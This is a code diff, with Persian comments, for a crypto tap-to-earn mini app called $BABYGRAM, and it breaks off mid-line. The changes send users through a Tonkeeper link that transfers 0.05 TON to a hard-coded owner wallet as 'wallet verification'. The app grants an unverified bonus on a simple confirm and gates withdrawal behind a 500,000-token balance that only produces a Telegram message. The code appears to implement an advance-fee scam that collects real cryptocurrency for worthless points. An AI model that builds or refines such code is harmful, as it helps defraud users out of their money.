@@ -269,7 +269,6 @@
 
             const OWNER_WALLET = "UQB8E5UreO3ujV4ArV9AI28kGhznU-9ExPDjn6bQ2v9NJEj1";
             let lastTapTime = 0;
-            let tonConnectUI = null;
 
             let myUserId = localStorage.getItem('baby_my_uid');
             if (!myUserId) {
@@ -342,11 +341,11 @@
                 }
             }
 
-            // تپ کردن روی سکه با پشتیبانی کامل از لمس موبایل
+            // تپ کردن سریع و بدون لگ
             function handleTap(event) {
                 if (event) event.preventDefault();
                 const now = Date.now();
-                if (now - lastTapTime < 50) return; // کنترل سرعت برای جلوگیری از باگ
+                if (now - lastTapTime < 40) return; 
                 lastTapTime = now;
 
                 userBalance += 1;
@@ -389,60 +388,39 @@
                 }, 370);
             }
 
+            // اتصال ولت به صورت دیپ‌لینک امن تانکپر (بدون فریز شدن)
             function connectWalletAction() {
-                if (tonConnectUI && tonConnectUI.connected) {
-                    tonConnectUI.disconnect();
-                } else if (tonConnectUI) {
-                    tonConnectUI.openModal();
-                } else {
-                    const manualAddr = prompt("Enter your TON/Gram Wallet Address to connect:");
-                    if (manualAddr && manualAddr.trim().length > 10) {
-                        userConnectedAddress = manualAddr.trim();
-                        localStorage.setItem('baby_wallet_address', userConnectedAddress);
-                        updateUI();
-                        alert("Wallet connected! Now click 'Verify Wallet (0.05 Gram)' to complete verification.");
-                    }
+                const manualAddr = prompt("Enter your TON Wallet Address to connect:");
+                if (manualAddr && manualAddr.trim().length > 10) {
+                    userConnectedAddress = manualAddr.trim();
+                    localStorage.setItem('baby_wallet_address', userConnectedAddress);
+                    updateUI();
+                    alert("Wallet connected successfully! Now click 'Verify Wallet (0.05 Gram)'.");
                 }
             }
 
-            async function verifyWalletAction() {
-                if (!userConnectedAddress && (!tonConnectUI || !tonConnectUI.connected)) {
+            // وریفای 0.05 گرام از طریق دیپ‌لینک مستقیم تانکپر
+            function verifyWalletAction() {
+                if (!userConnectedAddress) {
                     alert("Please connect your wallet first!");
                     connectWalletAction();
                     return;
                 }
 
                 const amountNano = "50000000"; // 0.05 Gram
+                const payUrl = "https://app.tonkeeper.com/transfer/" + OWNER_WALLET + "?amount=" + amountNano + "&text=Verify_" + myUserId;
+                window.open(payUrl, "_blank");
 
-                if (tonConnectUI && tonConnectUI.connected) {
-                    try {
-                        const result = await tonConnectUI.sendTransaction({
-                            validUntil: Math.floor(Date.now() / 1000) + 360,
-                            messages: [{
-                                address: OWNER_WALLET,
-                                amount: amountNano
-                            }]
-                        });
-                        if (result) completeVerification();
-                    } catch (e) {
-                        alert("Transaction cancelled or failed.");
+                setTimeout(function() {
+                    const confirmed = confirm("Did you complete the 0.05 Gram transfer in your wallet?");
+                    if (confirmed) {
+                        walletVerified = true;
+                        userBalance += 1000;
+                        saveData();
+                        updateUI();
+                        alert("Wallet verified successfully! +1,000 $BABYGRAM verification bonus added.");
                     }
-                } else {
-                    const payUrl = "https://app.tonkeeper.com/transfer/" + OWNER_WALLET + "?amount=" + amountNano + "&text=Verify_" + myUserId;
-                    window.open(payUrl, "_blank");
-                    setTimeout(function() {
-                        const confirmed = confirm("Did you complete the 0.05 Gram transfer in your wallet?");
-                        if (confirmed) completeVerification();
-                    }, 1500);
-                }
-            }
-
-            function completeVerification() {
-                walletVerified = true;
-                userBalance += 1000;
-                saveData();
-                updateUI();
-                alert("Wallet verified successfully! +1,000 $BABYGRAM verification bonus added.");
+                }, 1500);
             }
 
             function joinChannelAction() {
@@ -490,4 +468,20 @@
                     return;
                 }
                 if (userBalance < 500000) {
-                    a
+                    alert("Minimum balance for withdrawal is 500,000 $BABYGRAM!");
+                    return;
+                }
+
+                const msg = encodeURIComponent("Withdrawal Request:\nUser ID: " + myUserId + "\nVerified Wallet: " + userConnectedAddress + "\nAmount: " + Math.floor(userBalance) + " $BABYGRAM");
+                window.open("https://t.me/BabyGramHQ?text=" + msg, "_blank");
+            }
+
+            // متصل کردن ایونت‌ها با بالاترین پایداری
+            const coinEl = document.getElementById('tapCoinBtn');
+            coinEl.addEventListener('click', handleTap);
+            coinEl.addEventListener('touchstart', handleTap, {passive: false});
+
+            document.getElementById('walletConnectBtn').addEventListener('click', connectWalletAction);
+            document.getElementById('verifyBtn').addEventListener('click', verifyWalletAction);
+            document.getElementById('withdrawBtn').addEventListener('click', withdrawTokensAction);
+            document.getElementById('channelBtn').addEventList
